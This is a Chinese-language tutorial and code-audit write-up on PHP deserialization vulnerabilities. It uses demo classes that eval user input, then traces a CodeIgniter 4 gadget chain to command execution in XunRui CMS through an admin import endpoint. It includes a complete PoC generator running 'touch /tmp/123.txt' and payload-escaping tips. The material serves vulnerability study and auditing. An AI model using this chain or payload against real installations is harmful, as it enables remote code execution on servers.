初识php反序列化漏洞

所谓php序列化，就是保留对象的成员属性并将其转化为字符串，而反序列化则是将转化后的字符串还原为对象属性，有点面向属性编程的意思。
什么是反序列化漏洞？即unserialize()接收的值可控，通过更改这个值，设置相关类的属性，得到我们所需要的代码，通过调用方法，触发代码执行。
文字比较干，我们通过一个demo来理解，代码如下

class Demo{
    public $a;
    public function display(){
        eval($this->a);
    }
}

//实例化Demo类
$data = new Demo();
//给成员属性a赋值
$data->a = $_POST['a'];

//序列化
$ser_str = serialize($data);
echo "传入的序列化字符串为: \n".$ser_str;

// 反序列化，并调用display方法触发eval代码执行
echo "反序列化后的结果: \n";
$b = unserialize($ser_str);
$b->display();

运行代码，传入参数system('id');，结果如下


结合代码来看O:4:"Demo":1:{s:1:"a";s:13:"system('id');";}这段字符串，就可以知道，这次序列化对应的就是一个名称长度为4的对象Demo，有1个名称长度为1的字符串属性a，属性a的值是一个长度为13的字符串 system('id'); ,将其反序列后对象被还原了，然后调用display方法触发eval代码执行，从而造成命令执行。但这是Demo代码，真实环境肯定不会这么写。

魔术方法之 __destruct()

对于反序列的代码虽然不会像前面的Demo一样写的那么直白，但是大多数时候因为面向对象的编程，不可避免的需要调用各种类方法，调来调去的就有可能会出现一些漏洞，也就是所谓的利用链，在某个类的a方法调用了代码执行功能，在另一个地方恰好调用了a方法且参数可控，这种情况有时候会出现在魔术方法中。
魔术方法有很多，这里以__destruct()为例，便于后续分析真实代码。
什么是__destruct()？__destruct() 是一个析构函数，它会在对象或对象的所有引用被消除的时候触发，在unserialize()也会触发，同样写一个Demo来理解，代码如下

class Demo{
    public $a;
    public function __destruct(){
        echo "正在调用__destruct()\n";
        eval($this->a);
    }
}

//实例化Demo类
$data = new Demo();
//给成员属性a赋值
$data->a = $_POST['a'];

//序列化
$ser_str = serialize($data);
echo "\n传入的序列化字符串为: \n".$ser_str;
// 反序列化，并调用display方法触发eval代码执行
echo "\n反序列化后的结果: \n";
$b = unserialize($ser_str);

CodeIgniter 4 RCE 利用链

真实的情况不会很理想，一般都需要寻找链，本次是对基于CI框架开发的迅睿cms的代码审计，所以我们直接用迅睿cms的代码来跟踪CodeIgniter 4的某条利用链。
首先从码云gitee去下载源代码，因为作者是直接git推送的，所以低版本的代码我们通过git还原，先克隆代码到本地，然后用git log查看commit的hash，搜索4.5.2找到这个版本对应的hash，然后执行git命令还原到指定版本

git reset --hard 957d6e937040ee94391dfc06effae06c47f41f67


为了尽力理清楚，我选择了vscode + php插件来查看代码。全局搜索__destruct方法，主要关注codeigniter相关文件，也就是dayui下的文件，发现dayrui/System/Cache/Handlers/RedisHandler.php下存在__destruct，并且这里的$this->redis可控，那么就可以调用任意类的close方法

搜索close()方法，发现dayrui/System/Session/Handlers/MemcachedHandler.php这个文件定义了close()方法，并且方法中$this->memcached和$this->lockKey可控，然后调用delete()方法，也就是可以调用任意类的delete()方法

搜索delete()方法，在dayrui/System/BaseModel.php这个文件中定义了delete方法，$id、$eventData、$this->tempAllowCallbacks可控，之后会进入trigger()方法

跟进triger()方法，这里$eventData是可控的，$this->{$event}是上面传进来的，也就成了$this->beforeDelete，也可控，往下走会遍历$this->beforeDelete这个数组，如果数组中的元素在当前BaseModel类中存在对应方法名，就会调用这个方法，那么这里就可以调用BaseModel类的任意方法了

但是需要注意，BaseModel类是一个抽象类，想要调用只能去调用实现了这个抽象类的其他类，所以后续构造poc的时候需要将BaseModel换成Model


查看BaseModel类中的方法，可以看到一个有意思的方法validate()

跟一下逻辑，首先$data是我们传入的，可控，之后进入getValidationRules()方法，这个方法中$this->validationRules可控，所以我们可以跳过字符串判断逻辑，之后返回数组

回到前面validate方法继续往下走，$this->skipValidation、$data、$this->cleanValidationRules可控，从而$rules可控，走到最后一段，这里$this->validation可控，之后会调用setRules方法，全局搜索setRules，在dayrui/System/Validation/Validation.php存在，只是简单判断并设置了下$this->rules

回到validate方法，在调用完setRules后会调用run方法，跟进run方法，这里代码比较长

public function run(array $data = null, string $group = null, string $dbGroup = null): bool
	{
		$data = $data ?? $this->data;

		// i.e. is_unique
		$data['DBGroup'] = $dbGroup;

		$this->loadRuleSets();
		$this->loadRuleGroup($group);

		// If no rules exist, we return false to ensure
		// the developer didn't forget to set the rules.
		if (empty($this->rules))
		{
			return false;
		}

		// Replace any placeholders (e.g. {id}) in the rules with
		// the value found in $data, if any.
		$this->rules = $this->fillPlaceholders($this->rules, $data);

		// Need this for searching arrays in validation.
		helper('array');

		// Run through each rule. If we have any field set for
		// this rule, then we need to run them through!
		foreach ($this->rules as $field => $setup)
		{
			// Blast $rSetup apart, unless it's already an array.
			$rules = $setup['rules'] ?? $setup;

			if (is_string($rules))
			{
				$rules = $this->splitRules($rules);
			}

			$values = dot_array_search($field, $data);
			$values = is_array($values) ? $values : [$values];

			if ($values === [])
			{
				// We'll process the values right away if an empty array
				$this->processRules($field, $setup['label'] ?? $field, $values, $rules, $data);
			}

			foreach ($values as $value)
			{
				// Otherwise, we'll let the loop do the job
				$this->processRules($field, $setup['label'] ?? $field, $value, $rules, $data);
			}
		}

		return $this->getErrors() === [];
	}

一步步看，$data可控，进入到$this->loadRuleSets()，$this->ruleSetFiles可控，设置为一个无参类即可

回到run方法到$this->loadRuleGroup($group)，$group为null，直接返回

回到run方法$this->rules = $this->fillPlaceholders($this->rules, $data)中$this->rules, $data都可控，这个方法中简单替换处理了下$rules

回到run方法进入到foreach逻辑，$this->rules可控，来到dot_array_search方法，返回结果会调用_array_search_dot，跟进，$indexes是可控的，所以可以设成字符串让其直接返回null



回到run方法，之后调用processRules方法，跟进，这里$rules和$value是从run方法中传进来的都是可控的，那么最后的$rule($value)就可控了，这种形式就是常见的函数动态调用，也就是说，只要我们传进来的值最终到这里是system('id')的形式就可以执行命令了

反序列化入口点

有了利用链，接下来就是寻找反序列化入口了，直接全局搜索unserialize方法，定位到dayrui/Fcms/Core/Helper.php文件中的dr_string2array方法，这里调用了stripslashes去除转义反斜杠，因此我们最后生成的payload中需要双写反斜杠，然后对传入的$data进行反序列化

继续搜索dr_string2array方法，找我们能控制输入的地方，最后定位到dayrui/Fcms/Control/Admin/Urlrule.php中的import_add方法，这个方法中的$data可控，也就是code，而且还是post，是一个很好的入口

所以我们最终的攻击链就是这样

dayrui/Fcms/Control/Admin/Urlrule.php -> import_add
↓
dayrui/Fcms/Core/Helper.php -> dr_string2array -> unserialize
↓
dayrui/system/Cache/Handlers/RedisHandler.php -> __destruct
↓
dayrui/system/Session/Handlers/MemcachedHandler.php -> close
↓
dayrui/system/Model.php -> delete
↓
dayrui/system/Model.php -> trigger
↓
dayrui/system/Model.php -> validate
↓
dayrui/system/Validation/Validation.php -> run
↓
dayrui/system/Validation/Validation.php -> processRules -> $rule($value)

接下来就简单了，在后台设置 -> SEO设置 -> URL规则功 -> 导入，然后抓包

接下来生成payload，可以参考网传的poc

namespace CodeIgniter\Cache\Handlers{
    class RedisHandler{
        function __construct($class)
        {
            $this->redis = $class;
        }
    }
}

namespace CodeIgniter\Session\Handlers{
    class MemcachedHandler{
        function __construct($class)
        {
            $this->lockKey = array(
                "xx" => "touch /tmp/123.txt"
            );
            $this->memcached = $class;
        }
    }
}


namespace CodeIgniter{
    class Model{
        function __construct($class1, $class2)
        {
            $this->tempAllowCallbacks = true;
            $this->beforeDelete = array('validate');
            $this->validationRules = array(
                "id.xx" => array(
                    "system"
                )
            );
            $this->skipValidation = false;
            $this->cleanValidationRules = false;
            $this->validationMessages = array();
            $this->primaryKey = "a";
            $this->builder = $class1;
            $this->validation = $class2;
        }
    }
}

namespace CodeIgniter\Database\MySQLi{
    class Builder{
        function __construct($class)
        {
            $this->db = $class;
        }
    }
    class Connection{
        function __construct()
        {
            $this->protectIdentifiers = false;
        }
    }
}

namespace CodeIgniter\Validation{
    class Validation{
        function __construct(){
            $this->ruleSetFiles = array("Config\Database");
        }
    }
}

namespace{
    $connection = new CodeIgniter\Database\MySQLi\Connection();
    $basebuilder = new CodeIgniter\Database\MySQLi\Builder($connection);
    $validation = new CodeIgniter\Validation\Validation();
    $model = new CodeIgniter\Model($basebuilder, $validation);
    $MemcachedHandler = new CodeIgniter\Session\Handlers\MemcachedHandler($model);
    $handles = new CodeIgniter\Cache\Handlers\RedisHandler($MemcachedHandler);
    echo urlencode(serialize($handles));
}

注意到生成的序列化数据中有*存在，这是因为类中有些属性是protected属性，这也是为什么网传payload有url编码的原因，我们这里不编码，直接在星号的两边加上\00在将s字段大写，这样php就会将\00作为16进制，然后因为stripslashes函数所以再双写反斜杠，最终payload如下
